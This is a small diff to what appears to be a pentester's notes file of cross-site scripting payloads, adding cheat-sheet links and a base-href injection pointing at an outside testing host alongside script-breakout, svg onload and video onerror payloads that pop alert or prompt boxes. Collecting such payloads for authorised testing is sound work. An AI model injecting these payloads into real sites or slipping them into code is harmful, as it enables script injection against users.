@@ -1,3 +1,9 @@
+Useful Links:
+https://owasp.org/www-community/xss-filter-evasion-cheatsheet
+http://seguretat.wiki.uoc.edu/index.php/XSS_Cheat_Sheet
+
+Frequently used Payloads:
+<base href=//knoxss.me?>
 <video><source src=x onerror=alert(1)></video>
 '"></script><svg onload=prompt()>
 '"></script><video><source src=x onerror=alert(1)></video>
